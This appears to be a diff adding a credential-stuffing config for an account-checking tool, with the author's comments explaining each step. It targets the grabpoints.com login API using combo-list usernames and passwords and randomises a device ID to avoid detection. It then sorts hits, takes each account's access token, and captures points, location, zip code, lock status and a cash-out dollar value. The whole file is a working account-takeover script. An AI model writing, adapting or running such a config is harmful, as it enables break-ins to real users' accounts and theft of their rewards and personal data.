@@ -1,0 +1,134 @@
+#----Start Comment
+# this bit of code creates a guid reason im using javascript and not the block is i code in 1.2.1 where there isnt actually a block for this so i use javascript incase you dont know what a guid looks like it looks like this: b21086d1-e1aa-4033-9ba8-f9185ebeaa32 its easy to see a guid they will normally looks like this and will always have a -4 i have it auto making guid coes static variables suck dick unless needed
+
+BEGIN SCRIPT JavaScript
+function createGuid(){  
+   function S4() {  
+      return (((1+Math.random())*0x10000)|0).toString(16).substring(1);  
+   }  
+   return (S4() + S4() + "-" + S4() + "-4" + S4().substr(0,3) + "-" + S4() + "-" + S4() + S4() + S4()).toLowerCase();  
+}  
+var ID = createGuid(); 
+END SCRIPT -> VARS "ID"
+
+#----End Comment
+
+#----Start Comment
+# this is self knowledge basically all this is doing is calculating how long this strong of data is in the content look in the next comment to see how i used the other 2 variables
+
+FUNCTION Length "{\"address\":{},\"avatarURL\":\"/assets/i/avatar/default.png\",\"state\":\"auth\",\"userName\":\"<USER>\",\"password\":\"<PASS>\",\"passwordVerification\":\"\",\"newPassword\":\"\"}" -> VAR "l" 
+
+#----End Comment
+
+#----Start Comment
+# this is me using the post request block to there auth url using the content that i measured above (check above url) and here you can see: HEADER "X-Device-OS-ID: <ID>" this is where i put the guid so it isnt static: HEADER "Content-Length: <l>" this is the content length variable where it will calculate the length not needed but i always do this
+
+REQUEST POST "https://api.grabpoints.com/login" 
+  CONTENT "{\"address\":{},\"avatarURL\":\"/assets/i/avatar/default.png\",\"state\":\"auth\",\"userName\":\"<USER>\",\"password\":\"<PASS>\",\"passwordVerification\":\"\",\"newPassword\":\"\"}" 
+  CONTENTTYPE "application/vnd-v4.0+json" 
+  HEADER "Host: api.grabpoints.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/vnd-v4.0+json" 
+  HEADER "X-GP-ACCESS-TOKEN: null" 
+  HEADER "X-Device-OS-ID: <ID>" 
+  HEADER "X-Device-Time-Zone: Europe/London" 
+  HEADER "Content-Length: <l>" 
+  HEADER "Origin: https://members.grabpoints.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://members.grabpoints.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+#----End Comment
+
+#----Start Comment
+# i mean this is simple it will see what response i get and if i get a good response of principal the config carries on checking
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "bad credentials" 
+  KEYCHAIN Success OR 
+    KEY "\"principal\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Your account has been flagged for suspicious access. Please click the Help button below to troubleshoot further" 
+    KEY "ACCESS_DENIED" 
+
+#----End Comment
+
+#----Start Comment
+# believe it or not this line of code is probs the most important line of code here because this gets the accounts accesstoken so we can work on capture
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
+
+#----End Comment
+
+#----Start Comment
+# this is the whole capture process get request to there customer and in the header using there access token then parsing all the information 
+
+REQUEST GET "https://api.grabpoints.com/api/customer" 
+  
+  HEADER "Host: api.grabpoints.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/vnd-v4.0+json" 
+  HEADER "X-GP-ACCESS-TOKEN: <accessToken>" 
+  HEADER "X-Device-OS-ID: <ID>" 
+  HEADER "X-Device-Time-Zone: Asia/Kolkata" 
+  HEADER "Origin: https://members.grabpoints.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Referer: https://members.grabpoints.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "points" CreateEmpty=FALSE -> CAP "points" 
+
+PARSE "<SOURCE>" JSON "referralsEarnings" CreateEmpty=FALSE -> CAP "referralsEarnings" 
+
+PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "city" 
+
+PARSE "<SOURCE>" JSON "countryCode" CreateEmpty=FALSE -> CAP "countryCode" 
+
+PARSE "<SOURCE>" JSON "locked" CreateEmpty=FALSE -> CAP "locked" 
+
+PARSE "<SOURCE>" JSON "zip" CreateEmpty=FALSE -> CAP "zip" 
+
+#----End Comment
+
+#----Start Comment
+# once again another keycheck but this is different when i parsed points i want to check if its value is greater than 1 if 0 goes to custom if 1 has chance to cashout
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<points>" GreaterThan "1" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<points>" EqualTo "0" 
+
+#----End Comment
+
+#----Start Comment
+# checking if the account is locked for cashout or not
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<locked>" Contains "False" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<locked>" Contains "True" 
+
+#----End Comment
+
+#----Start Comment
+# function compute is im diving the number of points by 1 thousand because of the way they display there points and im using the constant so in capture they see how much balance is in the account
+
+FUNCTION Compute "<points>/1000" -> VAR "d" 
+
+FUNCTION Constant "$<d>" -> CAP "Amount In Dollars" 
+
+#----End Comment
+
